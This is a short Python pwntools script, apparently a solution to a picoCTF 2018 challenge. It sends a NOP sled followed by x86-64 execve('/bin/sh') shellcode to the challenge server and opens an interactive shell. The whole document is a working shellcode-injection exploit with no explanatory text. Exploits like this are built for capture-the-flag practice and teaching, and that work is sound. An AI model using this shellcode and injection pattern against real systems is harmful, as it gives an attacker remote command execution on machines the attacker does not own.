from pwn import *

sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

prefix = (0xffa - len(sc)) * '\x90'

p = remote('2018shell1.picoctf.com', 58896)

print(p.readuntil('> '))
p.sendline(prefix+sc)
p.interactive()
